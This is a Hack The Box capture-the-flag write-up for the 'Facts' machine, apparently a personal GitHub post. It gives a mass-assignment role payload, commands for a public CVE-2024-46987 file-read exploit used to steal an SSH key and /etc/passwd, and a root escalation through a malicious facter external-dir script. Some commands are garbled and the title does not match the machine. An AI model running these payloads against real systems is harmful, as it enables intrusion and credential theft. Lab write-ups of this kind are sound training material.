# 🚀 Hack The Box - Dancing Write-up

### **Machine Information**
| Machine Name | Target IP | Difficulty | Focus Service | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Facts** | `10.129.57.204`| Easy | Linux | **SOLVED** ✅ |

<img width="888" height="592" alt="Screenshot 2026-05-13 163627" src="https://github.com/user-attachments/assets/9dd74110-86b2-49d3-b290-34e222c6b975" />



## 📝 Introduction & Executive Summary
This writeup documents the complete, step-by-step security auditing and exploitation lifecycle for the **Facts** machine on Hack The Box. The assessment covers initial network discovery, directory  brute forcing via Gobuster, exploiting a Mass Assignment vulnerability on Camaleon CMS via Burp Suite to escalate web privileges, deploying an authenticated Arbitrary File Read exploit (CVE-2024-46987) to exfiltrate an encrypted SSH private key, cracking the key's passphrase, and finally abusing a wildcard `NOPASSWD` sudoers configuration on the `facter` binary to achieve full root privileges.

---

## 1. Reconnaissance & Information Gathering

### Network Environment Verification
Before executing any active scanning against the target infrastructure, we checked our local networking interfaces using the `ip a` command. This step verifies that our OpenVPN tunnel (`tun0`) is active and captures our attacker host IP address, which was assigned as `10.10.14.18`.



<img width="1015" height="370" alt="Screenshot 2026-05-13 141246" src="https://github.com/user-attachments/assets/cf4e3691-f5be-4e48-911b-a401b90bb9a1" />



### Host Discovery (Ping)
With the VPN tunnel verified, we initiated an ICMP echo request using the `ping` utility to confirm that the target lab instance at IP address `10.129.57.204` was online and responsive.

<img width="688" height="187" alt="Screenshot 2026-05-13 124121" src="https://github.com/user-attachments/assets/a9e5b215-0862-4a18-b2ba-60d20584ed65" />



### Local DNS Resolution Configuration
The target instance uses name-based virtual hosting to route incoming traffic. To ensure our tools and browser could resolve the server's platform headers correctly, we opened our local `/etc/hosts` configuration file using the `nano` text editor:

```bash
sudo nano /etc/hosts
```


<img width="350" height="61" alt="Screenshot 2026-05-13 124421" src="https://github.com/user-attachments/assets/57754e19-c344-4b35-b108-b021a0311ca4" />


### We appended a static host entry mapping 10.129.57.204 to facts.htb. Below is the verified state of the local routing file:
 
<img width="1265" height="754" alt="Screenshot 2026-05-13 124408" src="https://github.com/user-attachments/assets/cc85ed35-a8ea-4ac1-ab54-5ab6b80e6d22" />

### Directory Brute Forcing via Gobuster
To discover hidden directories and potential entry points on the facts.htb web server, we performed a directory brute-forcing attack using Gobuster. We utilized the standard directory-list-2.3-medium.txt wordlist to map out the web structure:

```bash
gobuster dir http://facts.htb//usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt php.htm 1, txt, js, bak, sql, log, zip, tar, png, gif.jpg.jpeg.py.ps1 -4
```

<img width="1603" height="764" alt="Screenshot 2026-05-13 164346" src="https://github.com/user-attachments/assets/601d403c-8b78-4b08-8284-507a0d4fad34" />

### The scan successfully enumerated several critical administrative paths, indicating the presence of a Camaleon CMS backend structure (such as /admin), which served as our primary gateway for the next phase.

## 2. Weaponization & Initial Access (Foothold)
### Analyzing the Web Application Layout
Navigating to http://facts.htb via our browser loaded the primary landing page of the target web application, revealing tampilan trivia

<img width="1715" height="909" alt="Screenshot 2026-05-13 143009" src="https://github.com/user-attachments/assets/afed9053-1b3d-41e6-bebc-054c3754b53c" />


To explore the authenticated surface area of the web , we accessed the public registration endpoint at /admin/register and created a standard low-privileged account under the username victimuser.

<img width="1292" height="810" alt="Screenshot 2026-05-13 124619" src="https://github.com/user-attachments/assets/888a744e-b395-4e86-b243-9ae55fbf1fb8" />


After logging into the backend panel, the default landing interface confirmed that our active session lacked administrative rights, hiding critical management configurations and system tools.

<img width="1285" height="793" alt="Screenshot 2026-05-13 124708" src="https://github.com/user-attachments/assets/490b2f31-2ead-40ee-ae55-947f9a50b022" />


Further inspection within the profile editor path (/admin/profile/edit) revealed that our internal database identifier was user ID 5, and our organizational group level was hardcoded as Client.

<img width="1272" height="800" alt="Screenshot 2026-05-13 124905" src="https://github.com/user-attachments/assets/b22b24bb-6988-48ea-b80f-b67e71581929" />

### Web Privilege Escalation via Mass Assignment
To bypass the role assignment restrictions, we attempted to alter our user properties directly during the submission process. We triggered a profile update action while proxying our browser traffic through Burp Suite Proxy to capture the raw outbound HTTP POST request.

<img width="1607" height="905" alt="Screenshot 2026-05-13 134052" src="https://github.com/user-attachments/assets/2ed23ea1-ec5d-4eab-b298-29879b1e77b0" />

The captured request parameters were sent to Burp Suite Repeater for modification. By targeting a known Mass Assignment / Parameter Pollution weakness in the way the application processes form inputs, we manually appended an unvalidated role modification parameter to the end of the data payload body:


The captured request parameters were sent to Burp Suite Repeater for modification. By targeting a known Mass Assignment / Parameter Pollution weakness in the way the application processes form inputs, we manually appended an unvalidated role modification parameter to the end of the data payload body:

```plaintext
&user%5Brole%5D=admin
```

<img width="1599" height="896" alt="Screenshot 2026-05-13 135926" src="https://github.com/user-attachments/assets/66085276-db9f-4f5c-afed-f947417a76e2" />


The underlying Ruby on Rails model processed the injected parameter without server-side restriction, returning a successful HTTP 200 OK response.

Refreshing our dashboard view confirmed that our account permissions had been successfully modified. The victimuser account now possessed full Administrator privileges, unlocking the complete CMS administration menu structure, including Contents, Media, Appearance, Plugins, and Settings.

<img width="1702" height="900" alt="Screenshot 2026-05-13 140040" src="https://github.com/user-attachments/assets/f635ed0e-14be-447d-99c7-4ca743212bf8" />

### Exploiting Arbitrary File Read (CVE-2024-46987)
With elevated administrative session tokens established, we analyzed the active platform version (Version 2.9.0), which is vulnerable to an authenticated Arbitrary File Read flaw tracked under CVE-2024-46987.

We fetched a public exploit script designed for this vulnerability from GitHub onto our local testing machine and verified the file structure:
```bash
sudo git clone https://github.com/Goultarde/CVE-2024-46987
cd CVE-2024-46987
ls
```

<img width="1919" height="1018" alt="Screenshot 2026-05-13 160019" src="https://github.com/user-attachments/assets/228fb76a-d070-4122-b564-a963781b1d08" />
<img width="421" height="111" alt="Screenshot 2026-05-13 155736" src="https://github.com/user-attachments/assets/c421189e-a56f-4bda-9524-42d252191e9a" />




We ran the script against the target, providing our compromised administrator credentials. To verify our arbitrary file read primitive, we first targeted the system's `/etc/passwd` file. The server processed the disclosure request, revealing valid system user accounts, notably `trivia` and `william` .

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l victimuser -p Admin@12345 /etc/passwd
```
<img width="1124" height="604" alt="Screenshot 2026-05-13 155747" src="https://github.com/user-attachments/assets/8c890c50-03ea-4be2-941c-4af2e7eaf065" />

Having validated our read capability, we shifted our focus to extracting sensitive access credentials. We successfully exfiltrated the encrypted OpenSSH private key (id_ed25519) belonging to the user trivia from their home profile storage directory:

```bash
python3 CVE-2024-46987.py -u http://facts.htb 1 victimuser -p Admin@12345 /home/trivia/.ssh/authorized_keys
python3 CVE-2024-46987.py -u http://facts.htb -l victimuser -p Admin@12345 /home/trivia/.ssh/id_ed25519
```
<img width="1056" height="239" alt="Screenshot 2026-05-13 155758" src="https://github.com/user-attachments/assets/14d1b10f-252f-4001-8baf-2ef61b50913e" />


3. Initial Shell Access & Passphrase Cracking
We transferred the recovered private key text block into a local file named id_ed25519 on our local environment using the nano utility:

```Bash
sudo nano id_ed25519
```
<img width="405" height="54" alt="Screenshot 2026-05-13 155821" src="https://github.com/user-attachments/assets/5433b1e1-0aed-4278-a1bc-c23965b7c6c2" />

To satisfy the strict security validation requirements of the native SSH client, we ran chmod to clear insecure global read permissions from our local key file:

```bash
chmod 600 id_ed25519
```

<img width="430" height="51" alt="Screenshot 2026-05-13 161043" src="https://github.com/user-attachments/assets/2a371ea1-57bb-4e79-98e9-f2966fba9793" />

### Because the private key block was protected by a passphrase, we extracted its internal cryptographic signature using ssh2john and loaded it into John the Ripper. Running the cracker against the rockyou.txt dictionary quickly exposed the valid passphrase:

<img width="873" height="210" alt="Screenshot 2026-05-13 160044" src="https://github.com/user-attachments/assets/acd43d7b-aace-4ebc-af77-19be423e3980" />


### Recovered SSH Passphrase: dragonballz



We then initiated an interactive SSH session to access our initial terminal foothold as the user trivia:

```bash
ssh -i id_ed25519 trivia@facts.htb
```
<img width="777" height="472" alt="Screenshot 2026-05-13 161051" src="https://github.com/user-attachments/assets/2da16842-3fc4-4286-8569-6dfb29ed7c4d" />


### 4. Local Privilege Escalation (PrivEsc)
### Enumerating Sudo Privileges
Immediately after landing an active shell session, we checked our user's system privileges by running sudo -l. The configuration layout exposed a critical administrative oversight: trivia was permitted to run the system utility /usr/bin/facter as the high-privileged root user without password authentication (NOPASSWD).
```bash
sudo -l
```
<img width="1227" height="103" alt="Screenshot 2026-05-13 222353" src="https://github.com/user-attachments/assets/6e44fb30-3b8b-4913-83e0-1cf98058e09c" />

### Exploiting Facter via External Directories
Direct environment manipulation via variables like FACTERLIB was blocked by security controls. However, the facter binary supports parsing and running external automation scripts from custom paths using the --external-dir argument.

Because any script inside that targeted path would be evaluated under root privileges, we created a customized malicious shell script payload inside the globally accessible /tmp folder. This script was programmed to copy the protected administrative root flag file and modify its permission bitmask to be world-readable:

```Bash
echo -e '#!/bin/bash\ncp /root/root.txt /tmp/root_flag.txt\nchmod 777 /tmp/root_flag.txt' > /tmp/exploit.sh
chmod +x /tmp/exploit.sh
```
<img width="1219" height="42" alt="Screenshot 2026-05-13 222802" src="https://github.com/user-attachments/assets/7e610615-6ad6-4f8c-b525-461418f745a4" />


We then invoked the facter binary to execute our script file under administrative root authority:

```bash
sudo /usr/bin/facter --external-dir /tmp
```
<img width="577" height="29" alt="Screenshot 2026-05-13 222606" src="https://github.com/user-attachments/assets/e0fe8dff-8522-4665-ad7c-63379d1d248e" />

The custom payload script was parsed and executed successfully by the root system process. We were then able to display the user flag from William's home folder and retrieve our final target administrative flag:

```Bash
cat /home/william/user.txt
```
<img width="522" height="37" alt="Screenshot 2026-05-13 222121" src="https://github.com/user-attachments/assets/b2755f46-b1e0-4937-9e81-2d8fa0be5d51" />


```bash
cat /tmp/root_flag.txt
```
<img width="697" height="38" alt="Screenshot 2026-05-13 222542" src="https://github.com/user-attachments/assets/205bc4d9-2646-4759-bd34-b0b9445c3b0c" />




### 5. Conclusion & Remediation
Disable Mass Assignment Vulnerabilities: Adjust the Ruby on Rails controllers to use strong parameters, filtering out unauthorized request adjustments (such as dropping direct form inputs aimed at user[role]).

### Patch Camaleon CMS: Upgrade the local web application instance to a secure branch to fix the underlying unauthenticated arbitrary file disclosure vulnerability.

### Restrict Sudo Privileges: Remove loose NOPASSWD entries from the system /etc/sudoers configuration for binaries like facter that allow arbitrary script or plugin execution.











---
**Documented by**: Pagar Kristian Panjaitan
